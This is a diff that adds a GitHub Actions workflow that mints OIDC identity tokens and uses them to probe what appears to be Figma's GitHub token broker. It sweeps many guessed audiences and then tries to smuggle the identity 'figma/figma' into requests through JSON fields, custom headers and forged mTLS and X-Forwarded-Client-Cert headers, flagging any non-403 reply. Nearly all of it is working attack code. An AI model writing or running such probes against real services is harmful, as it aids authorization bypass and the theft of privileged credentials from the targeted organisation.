@@ -1,0 +1,55 @@
+name: mint2
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: endpoint
+        required: true
+        default: https://example.com/
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  mint:
+    runs-on: self-hosted
+    steps:
+      - name: run
+        run: |
+          TARGET="${{ inputs.target }}"
+          openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem -days 1 -nodes -subj "/CN=probe" >/dev/null 2>&1
+          mint() {
+            if [ "$1" = "default" ]; then U="$ACTIONS_ID_TOKEN_REQUEST_URL"; else
+              Q=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$1"); U="$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$Q"; fi
+            curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$U" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))'
+          }
+          send() { # label ; token ; extra-curl-args...
+            L="$1"; T="$2"; shift 2
+            CODE=$(curl -sk -m 15 --cert c.pem --key k.pem -o o.txt -w '%{http_code}' -X POST "$@" "$TARGET")
+            if [ "$CODE" != "403" ]; then echo "*** DEVIATION label=$L CODE=$CODE BODY=$(head -c 300 o.txt)"; else echo "ok $L"; fi
+          }
+          echo "########## PART 1: audience sweep"
+          for AUD in gh-broker figma figma-gh-broker gh_broker gh-broker-figma figma-github-broker github-token-broker token-broker broker github github-app figma-corp figma.com https://figma.com https://www.figma.com https://api.figma.com api.figma.com gh-broker.figma.com gh-broker.staging.figma.com sts.amazonaws.com sigstore urn:figma:gh-broker figma-ci ci github-actions actions github-oidc oidc token https://gh-broker.figma.com/v1/token https://gh-broker.staging.figma.com/v1/token figma-github github-broker gh-broker-prod gh-broker-staging v1/token; do
+            T=$(mint "$AUD")
+            if [ -z "$T" ]; then echo "MINTFAIL $AUD"; continue; fi
+            send "aud=$AUD bearer" "$T" -H "Authorization: Bearer $T"
+            send "aud=$AUD body" "$T" -H 'Content-Type: application/json' --data-binary "{\"token\":\"$T\"}"
+          done
+          echo "########## PART 2: repository identity smuggling with a genuine token"
+          T=$(mint gh-broker)
+          echo "token_len=${#T}"
+          send repobody-repository "$T" -H 'Content-Type: application/json' --data-binary "{\"token\":\"$T\",\"repository\":\"figma/figma\"}"
+          send repobody-repo "$T" -H 'Content-Type: application/json' --data-binary "{\"token\":\"$T\",\"repo\":\"figma/figma\"}"
+          send repobody-owner "$T" -H 'Content-Type: application/json' --data-binary "{\"token\":\"$T\",\"owner\":\"figma\",\"repository_owner\":\"figma\"}"
+          send repobody-installation "$T" -H 'Content-Type: application/json' --data-binary "{\"token\":\"$T\",\"installation_id\":1,\"org\":\"figma\"}"
+          send repobody-audfigma "$T" -H 'Content-Type: application/json' --data-binary "{\"token\":\"$T\",\"aud\":\"gh-broker\",\"repository\":\"figma/figma\",\"repository_owner\":\"figma\"}"
+          send hdr-xrepo "$T" -H "Authorization: Bearer $T" -H 'X-GitHub-Repository: figma/figma' -H 'X-Repository: figma/figma'
+          send hdr-xowner "$T" -H "Authorization: Bearer $T" -H 'X-GitHub-Repo-Owner: figma' -H 'X-GitHub-Owner: figma'
+          send hdr-xsub "$T" -H "Authorization: Bearer $T" -H 'X-GitHub-Sub: repo:figma/figma:ref:refs/heads/main'
+          send query-repo "$T" -G --data-urlencode "token=$T" --data-urlencode "repository=figma/figma"
+          send mtls-cert "$T" -H 'X-Amzn-Mtls-Clientcert: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0t' -H 'X-Amzn-Mtls-Clientcert-Leaf: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0t' -H "Authorization: Bearer $T"
+          send xfcc "$T" -H 'X-Forwarded-Client-Cert: Hash=abc;Subject="CN=figma-ci,O=Figma, Inc."' -H "Authorization: Bearer $T"
+          echo "########## PART 3: no-token repo smuggling (control)"
+          send notoken-repo "" -H 'Content-Type: application/json' --data-binary '{"repository":"figma/figma","repository_owner":"figma"}'
+          echo DONE
